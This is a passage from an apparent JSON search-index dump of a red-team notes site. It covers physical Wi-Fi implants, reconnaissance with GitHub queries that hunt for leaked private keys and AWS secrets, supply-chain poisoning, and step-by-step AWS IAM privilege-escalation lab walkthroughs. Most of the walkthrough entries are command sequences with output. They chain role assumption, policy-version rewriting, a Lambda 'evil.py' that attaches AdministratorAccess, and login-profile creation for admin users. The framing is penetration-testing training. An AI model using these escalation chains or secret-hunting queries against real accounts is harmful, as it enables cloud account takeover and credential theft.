Hide a tiny device in a package and ship it off to the target to gain access to their network. Low build-cost means several can be shipped. The device can be tucked into the bottom of a packaging box or stuffed in a toy. While in transit, the device can do periodic basic wireless scans, similar to what a laptop does in war-driving when looking for Wi-Fi hotspots, and send its location coordinates via GPS back to the C&C server. Once having arrived it can be used for further attacks to gain a persistent foothold in the network. These attacks have their limitations. These include the amount of time it takes to perform the attack and the suspicions that arise when a car is detected circling a block hundreds of times with an auspicious antenna up top and a laptop in view, a drone circling around, and someone that seemingly aimlessly keeps wandering about. Resources  Stumbler is a tool for Windows that facilitates detection of Wireless LANs using the 802.11b, 802.11a and 802.11g WLAN standards. It runs on Microsoft Windows operating systems from Windows 2000 to Windows XP. A trimmed-down version called MiniStumbler is available for the handheld Windows CE operating system. The program is commonly used for wardriving, verifying network configurations, finding locations with poor coverage in a WLAN, detecting causes of wireless interference, detecting unauthorized (“rogue”) access points and aiming directional antennas for long-haul WLAN links. Wellenreiter is a wireless network discovery and auditing tool that supports Prism2, Lucent, and Cisco based cards. It is an easy to use Linux scanning tool. No card configuration has to be done and it is quite self-explanatory. It can discover networks (BSS/IBSS), and detects ESSID broadcasting or non-broadcasting networks and their WEP capabilities and the manufacturer automatically. DHCP and ARP traffic are decoded and displayed to give further information about the networks. An ethereal/tcpdump-compatible dumpfile and an Application savefile will be automatically created. Using a supported GPS device and the gpsd the location of the discovered networks can be tracked.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c207b124e1029a5ec3c5e3be2aa1f2e0",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/system",
    "t": "Gather system information ",
    "c": "Gather system information  Web server operating systems Server locations Users Passwords Website footprinting  Website footprinting is a technique in which information about the target is collected by monitoring the target’s website. Hackers can map the entire website of the target without being noticed. Website footprinting gives information about: Software Operating system Subdirectories  information Scripting platform Query details By examining the website headers, it is possible to obtain information about the following headers: Content-Type Accept-Ranges Connection Status Last-Modified Information X-powered-by Information Web Server Information Additional ways to gather information is through HTML Source Code and cookie examination. By examining the HTML source code, it is possible to extract information from the comments in the code, as well as gain insight into the file system structure by observing the links and image tags. Cookies can also reveal important information about the software that is running on the server and its behaviour. And by inspecting sessions, it is possible to identify the scripting platforms. Web spiders methodically browse a website in search of specific information. Information collected can be helpful in planning social engineering attacks. Cloning websites  Website mirroring or website cloning refers to the process of duplicating a website. Mirroring a website helps in browsing the site offline, searching the website for vulnerabilities, and discovering useful information. Websites may store documents of different format, which in turn may contain hidden information and metadata that can be analyzed and used in (planning) an attack. This metadata can be extracted with metadata extraction tools. Eyeing repositories  Look for hardcoded secrets: SQL passwords AWS access keys Google Cloud private keys API tokens Test accounts In GitHub search: # Sample of GitHub queries org:TargetName password org:TargetName aws_secret_access_key org:TargetName aws_key org:TargetName BEGIN RSA PRIVATE KEY org:TargetName BEGIN OPENSSH PRIVATE KEY org:TargetName secret_key org:TargetName hooks.slack.com/services org:TargetName sshpass -p org:TargetName sq0csp org:TargetName apps.googleusercontent.com org:TargetName extension:pem key Sensitive files discovery  Many tools for finding the URLs of sensitive files exist. One such tool is dirb , a web content discovery tool.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb6fd72785d297a4464039d9712e143c",
    "u": "https://cloud.tymyrddin.dev/docs/api/iam-auth",
    "t": "IAM based authentication ",
    "c": "IAM based authentication  API Gateway supports IAM-based authentication for the APIs, this is commonly used to restrict API access to IAM users. Even when IAM-based authentication is enabled on the API, resource policy plays an important role, and a misconfiguration in the resource policy can make the API accessible to all authenticated AWS users. Objective: Interact with the protected API and retrieve the flag.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "29b5ba0f998bab4c5f74b269813cd9d7",
    "u": "https://cloud.tymyrddin.dev/docs/iam/dangerous-policy-2",
    "t": "Dangerous policy combination II ",
    "c": "Dangerous policy combination II  Sometimes one policy itself might not be sufficient to perform a privileged operation, however, multiple policies can allow an IAM user/role to perform a chain of operation which ultimately leads to privilege escalation on the AWS account. Objective: Leverage the policies attached to the student user and attain administrative privileges on the AWS account. Get access to AWS lab credentials. Configure AWS CLI. Check identity with: ┌──(kali㉿kali)-[~] └─$ aws sts get-caller-identity { \"UserId\": \"AIDA3BWBONZK44EREYF5Q\", \"Account\": \"759541165653\", \"Arn\": \"arn:aws:iam::759541165653:user/student\" } List the policies attached to the student user: ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name student { \"AttachedPolicies\": [ { \"PolicyName\": \"IAMReadOnlyAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\" } ] } Get information about the attached policies: ┌──(kali㉿kali)-[~] └─$ aws iam list-user-policies --user-name student { \"PolicyNames\": [ \"terraform-20230511111609809100000003\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-user-policy --user-name student --policy-name terraform-20230511111609809100000003 { \"UserName\": \"student\", \"PolicyName\": \"terraform-20230511111609809100000003\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"sts:AssumeRole\" ], \"Effect\": \"Allow\", \"Resource\": [ \"arn:aws:iam::759541165653:role/Adder\", \"arn:aws:iam::759541165653:role/PolicyUpdater\" ] } ] } } Try creating a new user named Bob ┌──(kali㉿kali)-[~] └─$ aws iam create-user --user-name Bob An error occurred (AccessDenied) when calling the CreateUser operation: User: arn:aws:iam::759541165653:user/student is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::759541165653:user/Bob because no identity-based policy allows the iam:CreateUser action User creation failed due to insufficient privileges. Check Adder role policies and permissions. Also, check the role-policy document: ┌──(kali㉿kali)-[~] └─$ aws iam list-role-policies --role-name Adder { \"PolicyNames\": [ \"AddUser\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-role-policy --role-name Adder --policy-name AddUser { \"RoleName\": \"Adder\", \"PolicyName\": \"AddUser\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": \"iam:AddUserToGroup\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::759541165653:group/Printers\" } ] } } Role policy says that role Adder has permission to add any user to the Printers group. Assume Adder role with student user. ┌──(kali㉿kali)-[~] └─$ aws sts assume-role --role-arn arn:aws:iam::759541165653:role/Adder --role-session-name adder_test { \"Credentials\": { \"AccessKeyId\": \"<access key id>\", \"SecretAccessKey\": \"<secret access key>\", \"SessionToken\": \"<session token>\", \"Expiration\": \"2023-05-11T12:21:45+00:00\" }, \"AssumedRoleUser\": { \"AssumedRoleId\": \"AROA3BWBONZKUC67R3627:adder_test\", \"Arn\": \"arn:aws:sts::759541165653:assumed-role/Adder/adder_test\" } } Make a note of Credentials and tokens. Set the access key id, secret access key, and session token in environment variables: ┌──(kali㉿kali)-[~] └─$ export AWS_ACCESS_KEY_ID=<access key id> export AWS_SECRET_ACCESS_KEY=<secret access key> export AWS_SESSION_TOKEN=<session token> Add student user to printers group: ┌──(kali㉿kali)-[~] └─$ aws iam add-user-to-group --group-name Printers --user-name student Then unset environment variables: ┌──(kali㉿kali)-[~] └─$ unset AWS_ACCESS_KEY_ID unset AWS_SECRET_ACCESS_KEY unset AWS_SESSION_TOKEN List groups for the student user. ┌──(kali㉿kali)-[~] └─$ aws iam list-groups-for-user --user-name student { \"Groups\": [ { \"Path\": \"/\", \"GroupName\": \"Printers\", \"GroupId\": \"AGPA3BWBONZKTEZER727M\", \"Arn\": \"arn:aws:iam::759541165653:group/Printers\", \"CreateDate\": \"2023-05-11T11:15:53+00:00\" } ] } Successfully added a student user to the Printers group. Check the policies attached to the PolicyUpdater role policies and check the role-policy document: ┌──(kali㉿kali)-[~] └─$ aws iam list-role-policies --role-name PolicyUpdater { \"PolicyNames\": [ \"CreatePolicyVersion\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-role-policy --role-name PolicyUpdater --policy-name CreatePolicyVersion { \"RoleName\": \"PolicyUpdater\", \"PolicyName\": \"CreatePolicyVersion\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": \"iam:CreatePolicyVersion\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::759541165653:policy/Print\" } ] } } Role policy says that role PolicyUpdater has permission to create a new PolicyVersion for Print policy. Check the policies attached to the group Printers: ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-group-policies --group-name Printers { \"AttachedPolicies\": [ { \"PolicyName\": \"Print\", \"PolicyArn\": \"arn:aws:iam::759541165653:policy/Print\" } ] } The Print policy is attached to the Printers group. List the version of policies available for Print policy: ┌──(kali㉿kali)-[~] └─$ aws iam get-policy --policy-arn arn:aws:iam::759541165653:policy/Print { \"Policy\": { \"PolicyName\": \"Print\", \"PolicyId\": \"ANPA3BWBONZKWNU4TRXUN\", \"Arn\": \"arn:aws:iam::759541165653:policy/Print\", \"Path\": \"/\", \"DefaultVersionId\": \"v1\", \"AttachmentCount\": 1, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"CreateDate\": \"2023-05-11T11:15:53+00:00\", \"UpdateDate\": \"2023-05-11T11:15:53+00:00\", \"Tags\": [] } } View the policy document for v1 version of Print policy: ┌──(kali㉿kali)-[~] └─$ aws iam get-policy-version --policy-arn arn:aws:iam::759541165653:policy/Print --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Statement\": [ { \"Action\": \"s3:ListAllMyBuckets\", \"Effect\": \"Allow\", \"Resource\": \"*\" } ], \"Version\": \"2012-10-17\" }, \"VersionId\": \"v1\", \"IsDefaultVersion\": true, \"CreateDate\": \"2023-05-11T11:15:53+00:00\" } } Assume PolicyUpdater role: ┌──(kali㉿kali)-[~] └─$ aws sts assume-role --role-arn arn:aws:iam::759541165653:role/PolicyUpdater --role-session-name policy_test { \"Credentials\": { \"AccessKeyId\": \"<access key id>\", \"SecretAccessKey\": \"<secret access key>\", \"SessionToken\": \"<session token>\", \"Expiration\": \"2023-05-11T12:32:04+00:00\" }, \"AssumedRoleUser\": { \"AssumedRoleId\": \"AROA3BWBONZKR5T3QNZTX:policy_test\", \"Arn\": \"arn:aws:sts::759541165653:assumed-role/PolicyUpdater/policy_test\" } } Make a note of Credentials and tokens. Set the access key id, secret access key, and session token in environment variables: ┌──(kali㉿kali)-[~] └─$ export AWS_ACCESS_KEY_ID=<access key id> export AWS_SECRET_ACCESS_KEY=<secret access key> export AWS_SESSION_TOKEN=<session token> Create a new policy version and set it as default. Use the following policy document for Administrator Access: JSON: newAdminPolicy.json : { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\" } ] } ┌──(kali㉿kali)-[~] └─$ aws iam create-policy-version --policy-arn arn:aws:iam::759541165653:policy/Print --policy-document file://newAdminPolicy.json --set-as-default { \"PolicyVersion\": { \"VersionId\": \"v2\", \"IsDefaultVersion\": true, \"CreateDate\": \"2023-05-11T11:36:22+00:00\" } } Then unset environment variables: ┌──(kali㉿kali)-[~] └─$ unset AWS_ACCESS_KEY_ID unset AWS_SECRET_ACCESS_KEY unset AWS_SESSION_TOKEN Check the new version of the Print policy: ┌──(kali㉿kali)-[~] └─$ aws iam get-policy-version --policy-arn arn:aws:iam::759541165653:policy/Print --version-id v2 { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\" } ] }, \"VersionId\": \"v2\", \"IsDefaultVersion\": true, \"CreateDate\": \"2023-05-11T11:36:22+00:00\" } } Successfully created policy version. Try creating a new user on the AWS account named Bob to verify Administrator Access : ┌──(kali㉿kali)-[~] └─$ aws iam create-user --user-name Bob { \"User\": { \"Path\": \"/\", \"UserName\": \"Bob\", \"UserId\": \"AIDA3BWBONZKYHSFS46SQ\", \"Arn\": \"arn:aws:iam::759541165653:user/Bob\", \"CreateDate\": \"2023-05-11T11:38:38+00:00\" } } Successfully performed a privileged operation.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "071cfb3a52e3722828f47e4d29b435b7",
    "u": "https://cloud.tymyrddin.dev/docs/notes/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Notes on techniques used for: Leveraging cloud vulnerabilities identified to successfully penetrate security controls, using mostly manual attacks with only some semi-automated support. Gaining access to cloud application data and/or permissions (access) not previously available. Note: Exploitation of web services may not be possible given the security controls present, the complexity of the attack (undocumented, or not enough documentation/context), and the time allotment for testing. Why?  To overcome the challenges to build a meaningful and sustainable cloud testing practice. How?  Challenges and problems Account and privilege attacks Cloud-centric attacks Abusing misconfigurations Hacking CI/CD pipelines",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3f8c1ad7e53c567732f1167397e74213",
    "u": "https://cloud.tymyrddin.dev/docs/iam/pass-role-lambda",
    "t": "Pass Role: Lambda ",
    "c": "Pass Role: Lambda  Overly Permissive Permission can be abused by a user to perform privileged operations. Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account. The student user has the inline policy to allow iam:PassRole , lambda:CreateFunction , lambda:InvokeFunction , lambda:List* , lambda:Get* and lambda:Update* actions. Hence, student can pass an existing role to a Lambda function. If such a role exists which can be passed to Lambda and has enough permissions to help escalate, that would solve the lab. cat account_authorization_details | jq '.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Service==\"lambda.amazonaws.com\")' Check lab11lambdaiam role details: ┌──(kali㉿kali)-[~] └─$ aws iam get-role --role-name lab11lambdaiam { \"Role\": { \"Path\": \"/\", \"RoleName\": \"lab11lambdaiam\", \"RoleId\": \"AROA5Y7OCKXMHLTO5WESW\", \"Arn\": \"arn:aws:iam::947002693080:role/lab11lambdaiam\", \"CreateDate\": \"2023-05-12T14:10:51+00:00\", \"AssumeRolePolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Principal\": { \"Service\": \"lambda.amazonaws.com\" }, \"Action\": \"sts:AssumeRole\" } ] }, \"MaxSessionDuration\": 3600, \"RoleLastUsed\": {} } } ┌──(kali㉿kali)-[~] └─$ aws iam list-role-policies --role-name lab11lambdaiam { \"PolicyNames\": [ \"terraform-20230512141051960700000003\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-role-policy --role-name lab11lambdaiam --policy-name terraform-20230512141051960700000003 { \"RoleName\": \"lab11lambdaiam\", \"PolicyName\": \"terraform-20230512141051960700000003\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:AttachUserPolicy\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" } ] } } Create a python script with the following content Python Script: evil.py import boto3 def handler (): iam = boto3 . client ( \"iam\" ) response = iam . attach_user_policy ( UserName = \"student\" , PolicyArn = \"arn:aws:iam::aws:policy/AdministratorAccess\" ) return response Zip the python script using zip: ┌──(kali㉿kali)-[~] └─$ zip evil-function.zip evil.py adding: evil.py (deflated 28%) Create a lambda function on AWS account: ┌──(kali㉿kali)-[~] └─$ aws lambda create-function \\ --function-name evil-function \\ --runtime python3.8 \\ --zip-file fileb://evil-function.zip \\ --handler evil.handler \\ --role arn:aws:iam::947002693080:role/lab11lambdaiam { \"FunctionName\": \"evil-function\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:947002693080:function:evil-function\", \"Runtime\": \"python3.8\", \"Role\": \"arn:aws:iam::947002693080:role/lab11lambdaiam\", \"Handler\": \"evil.handler\", \"CodeSize\": 314, \"Description\": \"\", \"Timeout\": 3, \"MemorySize\": 128, \"LastModified\": \"2023-05-12T14:25:56.749+0000\", \"CodeSha256\": \"XLvcjDh044rFfFrPBHuvkNwDB107ntWqcMm29WXrNCM=\", \"Version\": \"$LATEST\", \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"f9de5359-7875-40a7-ab20-d11af815dcfb\", \"State\": \"Pending\", \"StateReason\": \"The function is being created.\", \"StateReasonCode\": \"Creating\", \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 }, \"SnapStart\": { \"ApplyOn\": \"None\", \"OptimizationStatus\": \"Off\" }, \"RuntimeVersionConfig\": { \"RuntimeVersionArn\": \"arn:aws:lambda:us-east-1::runtime:48ae60ef4cd46a5f33291797e798b3aaefe09e5000e8f58c605db8540c47dd8d\" } } Invoke the newly created Lambda function: ┌──(kali㉿kali)-[~] └─$ aws lambda invoke --function-name evil-function invoke_out.txt { \"StatusCode\": 200, \"ExecutedVersion\": \"$LATEST\" } Check attached policies on student user: ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name student Successfully attached AdministratorAccess policy to the student user. Try creating a new user on the AWS account: ┌──(kali㉿kali)-[~] └─$ aws iam create-user --user-name Bob",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "fb2d29ad917cff939fad97eaf5d6780f",
    "u": "https://cloud.tymyrddin.dev/docs/iam/dangerous-policy-1",
    "t": "Dangerous policy combination I ",
    "c": "Dangerous policy combination I  Sometimes one policy itself might not be sufficient to perform a privileged operation, however, multiple policies can allow an IAM user/role to perform a chain of operation which ultimately leads to privilege escalation on the AWS account. Objective: Leverage the policies attached to the student user and attain administrative privileges on the AWS account. Get access to AWS lab credentials. Configure AWS CLI. Check identity with: aws sts get-caller-identity List the policies attached to the student user: ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name student { \"AttachedPolicies\": [ { \"PolicyName\": \"IAMReadOnlyAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\" } ] } Try creating a new user named Bob: ┌──(kali㉿kali)-[~] └─$ aws iam create-user --user-name Bob An error occurred (AccessDenied) when calling the CreateUser operation: User: arn:aws:iam::527058492733:user/student is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::527058492733:user/Bob because no identity-based policy allows the iam:CreateUser action User creation failed due to insufficient privileges. Get information about the user’s inline policies and enumerate the attached policies: ┌──(kali㉿kali)-[~] └─$ aws iam list-user-policies --user-name student { \"PolicyNames\": [ \"terraform-20230511094032888700000002\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-user-policy --user-name student --policy-name terraform-20230511094032888700000002 { \"UserName\": \"student\", \"PolicyName\": \"terraform-20230511094032888700000002\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"sts:AssumeRole\" ], \"Effect\": \"Allow\", \"Resource\": [ \"arn:aws:iam::527058492733:role/Adder\", \"arn:aws:iam::527058492733:role/Attacher\" ] } ] } } Check resources mentioned in policy. Check policies attached to Adder and check the role-policy document: ┌──(kali㉿kali)-[~] └─$ aws iam list-role-policies --role-name Adder { \"PolicyNames\": [ \"AddUser\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-role-policy --role-name Adder --policy-name AddUser { \"RoleName\": \"Adder\", \"PolicyName\": \"AddUser\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": \"iam:AddUserToGroup\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::527058492733:group/Printers\" } ] } } Role policy says that role Adder has permission to add any user to the Printers group. Assume Adder role with student user: ┌──(kali㉿kali)-[~] └─$ aws sts assume-role --role-arn arn:aws:iam::527058492733:role/Adder --role-session-name adder_test { \"Credentials\": { \"AccessKeyId\": \"<access key id>\", \"SecretAccessKey\": \"<secret access key>\", \"SessionToken\": \"<session token>\", \"Expiration\": \"2023-05-11T10:50:20+00:00\" }, \"AssumedRoleUser\": { \"AssumedRoleId\": \"AROAXVNZCLU6ZGABQD4YD:adder_test\", \"Arn\": \"arn:aws:sts::527058492733:assumed-role/Adder/adder_test\" } } Make a note of Credentials and tokens. Set the access key id, secret access key, and session token in environment variables: ┌──(kali㉿kali)-[~] └─$ export AWS_ACCESS_KEY_ID=<access key id> export AWS_SECRET_ACCESS_KEY=<secret access key> export AWS_SESSION_TOKEN=<session token> Add student user to printers group: ┌──(kali㉿kali)-[~] └─$ aws iam add-user-to-group --group-name Printers --user-name student Unset environment variables: unset AWS_ACCESS_KEY_ID unset AWS_SECRET_ACCESS_KEY unset AWS_SESSION_TOKEN List groups for the student user: ┌──(kali㉿kali)-[~] └─$ aws iam list-groups-for-user --user-name student { \"Groups\": [ { \"Path\": \"/\", \"GroupName\": \"Printers\", \"GroupId\": \"AGPAXVNZCLU6Z4QWJM7KF\", \"Arn\": \"arn:aws:iam::527058492733:group/Printers\", \"CreateDate\": \"2023-05-11T09:40:16+00:00\" } ] } Successfully added student user to Printers group. Check the policies attached to the Attacher role and check the role-policy document: ┌──(kali㉿kali)-[~] └─$ aws iam list-role-policies --role-name Attacher { \"PolicyNames\": [ \"AttachPolicy\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-role-policy --role-name Attacher --policy-name AttachPolicy { \"RoleName\": \"Attacher\", \"PolicyName\": \"AttachPolicy\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": \"iam:AttachGroupPolicy\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::527058492733:group/Printers\" } ] } } Role policy says that the role Attacher has permission to attach any policy to the Printers group. Identify the ARN of the AdministratorAccess policy: ┌──(kali㉿kali)-[~] └─$ aws iam list-policies | grep 'AdministratorAccess' \"PolicyName\": \"AdministratorAccess\", \"Arn\": \"arn:aws:iam::aws:policy/AdministratorAccess\", \"PolicyName\": \"AdministratorAccess-Amplify\", \"Arn\": \"arn:aws:iam::aws:policy/AdministratorAccess-Amplify\", \"PolicyName\": \"AWSAuditManagerAdministratorAccess\", \"Arn\": \"arn:aws:iam::aws:policy/AWSAuditManagerAdministratorAccess\", \"PolicyName\": \"AdministratorAccess-AWSElasticBeanstalk\", \"Arn\": \"arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk\", Assume Attacher role: ┌──(kali㉿kali)-[~] └─$ aws sts assume-role --role-arn arn:aws:iam::527058492733:role/Attacher --role-session-name attacher_test { \"Credentials\": { \"AccessKeyId\": \"<access key id>\", \"SecretAccessKey\": \"<secret access key>\", \"SessionToken\": \"<session token>\", \"Expiration\": \"2023-05-11T11:03:51+00:00\" }, \"AssumedRoleUser\": { \"AssumedRoleId\": \"AROAXVNZCLU646LOFZYTU:attacher_test\", \"Arn\": \"arn:aws:sts::527058492733:assumed-role/Attacher/attacher_test\" } } Make a note of Credentials and tokens. Set the access key id, secret access key, and session token in environment variables: export AWS_ACCESS_KEY_ID=<access key id> export AWS_SECRET_ACCESS_KEY=<secret access key> export AWS_SESSION_TOKEN=<session token> Attach AdministratorAccess role to Printers group: ┌──(kali㉿kali)-[~] └─$ aws iam attach-group-policy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess Unset all environment variables: ┌──(kali㉿kali)-[~] └─$ unset AWS_ACCESS_KEY_ID unset AWS_SECRET_ACCESS_KEY unset AWS_SESSION_TOKEN Check policies attached to the Printers group: ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-group-policies --group-name Printers { \"AttachedPolicies\": [ { \"PolicyName\": \"AdministratorAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\" } ] } Successfully attached AdministratorAccess policy to Printers group. Try creating a new user named Bob to verify Administrator Access : ┌──(kali㉿kali)-[~] └─$ aws iam create-user --user-name Bob { \"User\": { \"Path\": \"/\", \"UserName\": \"Bob\", \"UserId\": \"AIDAXVNZCLU6WJG47ZMAA\", \"Arn\": \"arn:aws:iam::527058492733:user/Bob\", \"CreateDate\": \"2023-05-11T10:08:49+00:00\" } } Successfully performed a privileged operation.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "237270471b592582ad2adb743e81f1e3",
    "u": "https://cloud.tymyrddin.dev/docs/iam/mis-trust-policy",
    "t": "Misconfigured trust policy ",
    "c": "Misconfigured trust policy  Misconfigured trust policy can be leveraged to assume a role and perform privileged operations. Objective: Assume the role “ad-LoggingRole” on the AWS account “276384657722” and list the S3 buckets. Get access to AWS lab credentials. Configure AWS CLI. Assume ad-LoggingRole role: aws sts assume-role --role-arn arn:aws:iam::276384657722:role/ad-LoggingRole --role-session-name ad_logging Set access AWS_ACCESS_KEY_ID , AWS_SECRET_ACCESS_KEY , and AWS_SESSION_TOKEN in environment variables: Check with: aws sts get-caller-identity Get attached policies for ad-LoggingRole : aws iam list-attached-role-policies --role-name ad-LoggingRole The role has read access on the S3 and IAM service of the account. List s3 buckets: ┌──(kali㉿kali)-[~] └─$ aws s3 ls 2021-01-20 03:28:42 ad-secret-bucket-for-role 2021-03-14 14:10:17 attackdefense ...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "43ef1804be5bbe0b9d4392983319d86f",
    "u": "https://cloud.tymyrddin.dev/docs/notes/cicd",
    "t": "Hacking CI/CD pipelines ",
    "c": "Hacking CI/CD pipelines  Hacking CI/CD pipelines uses weaknesses in setup and configurations, such as: Access security User permissions Keys and secrets User security Default configurations The goal is to gain: Access to resources Access to the source code repository to include a payload in the codebase and in the deployed application Complete compromise of the infrastructure Poison open source supply chain  Create a new package  Develop and publish package Distribute in dependency trees by using a name similar to existing package names (so-called typosquatting or combosquatting ), or by reuseing an identifier of a project, package, or user account withdrawn by its original maintainer (use after free). Infect an existing package  Inject in source by making a pull request as contributor or committing as administrator (requires capturing credentials or tokens or social engineering) Inject during build by compromising the build system (MitM) and manipulating package download or running a malicious build. Inject in repository system by capturing credentials or tokens, exploiting vulnerabilities, or deploying in a mirror repository. Remediation  Securing CI/CD is a complex practice that encompasses the identification, remediation, and prevention of security risks across each stage of a pipeline. While building a robust security posture is essential, the framework is to also continue to maintain the agility and pace of release cycles. As a result, when compared to securing legacy frameworks, there are a number of additional challenges with administering security on CI/CD pipelines, including: Improper secrets management Inconsistent approaches to microservices Inadequate security automation Conflicts between security and velocity Unauthorised access to code registries Developer and DevOps resistance Resources  Backstabber’s Knife Collection: A Review of Open Source Software Supply Chain Attacks",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e3fc78fb6e9b07e994e5f81e70757a56",
    "u": "https://cloud.tymyrddin.dev/docs/iam/overly-permissive-2",
    "t": "Overly permissive permission II ",
    "c": "Overly permissive permission II  Overly Permissive Permission can be abused by a user to perform privileged operations. Objective: Leverage the policy attached to the student user and attain administrative privileges on the AWS account. Get access to AWS lab credentials. Configure AWS CLI. Get details of the current user: ┌──(kali㉿kali)-[~] └─$ aws iam get-user Get information about the policies attached to the user: ┌──(kali㉿kali)-[~] └─$ aws iam list-user-policies --user-name student { \"PolicyNames\": [ \"terraform-20230512111246646900000001\" ] } ┌──(kali㉿kali)-[~] └─$ aws iam get-user-policy --user-name student --policy-name terraform-20230512111246646900000001 { \"UserName\": \"student\", \"PolicyName\": \"terraform-20230512111246646900000001\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:CreateLoginProfile\", \"iam:ChangePassword\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" } ] } } The user has permission to create a login profile for any user. Check for users with AdministratorAccess policy attached to them: ┌──(kali㉿kali)-[~] └─$ aws iam list-users { \"Users\": [ { \"Path\": \"/\", \"UserName\": \"AdminBob\", \"UserId\": \"AIDAWEU26T2LEI4WDLHIO\", \"Arn\": \"arn:aws:iam::422305504918:user/AdminBob\", \"CreateDate\": \"2023-05-12T11:12:46+00:00\" }, { \"Path\": \"/\", \"UserName\": \"AdminJane\", \"UserId\": \"AIDAWEU26T2LFVJVEDGQI\", \"Arn\": \"arn:aws:iam::422305504918:user/AdminJane\", \"CreateDate\": \"2023-05-12T11:12:46+00:00\" }, { \"Path\": \"/\", \"UserName\": \"identity\", \"UserId\": \"AIDAWEU26T2LPLATV2YRP\", \"Arn\": \"arn:aws:iam::422305504918:user/identity\", \"CreateDate\": \"2023-05-12T11:12:55+00:00\" }, { \"Path\": \"/\", \"UserName\": \"student\", \"UserId\": \"AIDAWEU26T2LHYPC2TGST\", \"Arn\": \"arn:aws:iam::422305504918:user/student\", \"CreateDate\": \"2023-05-12T11:12:46+00:00\" } ] } ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name AdminBob { \"AttachedPolicies\": [ { \"PolicyName\": \"AdministratorAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\" } ] } ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name AdminJane { \"AttachedPolicies\": [ { \"PolicyName\": \"AdministratorAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\" } ] } ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name identity { \"AttachedPolicies\": [] } ┌──(kali㉿kali)-[~] └─$ aws iam list-attached-user-policies --user-name student { \"AttachedPolicies\": [ { \"PolicyName\": \"IAMReadOnlyAccess\", \"PolicyArn\": \"arn:aws:iam::aws:policy/IAMReadOnlyAccess\" } ] } Create a login profile for user AdminBob: ┌──(kali㉿kali)-[~] └─$ aws iam create-login-profile --user-name AdminBob --password abcd@12345 --no-password-reset-required { \"LoginProfile\": { \"UserName\": \"AdminBob\", \"CreateDate\": \"2023-05-12T11:18:50+00:00\", \"PasswordResetRequired\": false } } Sign in with the IAM user AdminBob and password “abcd@12345” in the AWS console. Successfully gained access to AdminBob user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "675737a271c655d0436146626f8cba1d",
    "u": "https://cloud.tymyrddin.dev/docs/notes/challenges",
    "t": "Challenges and problems ",
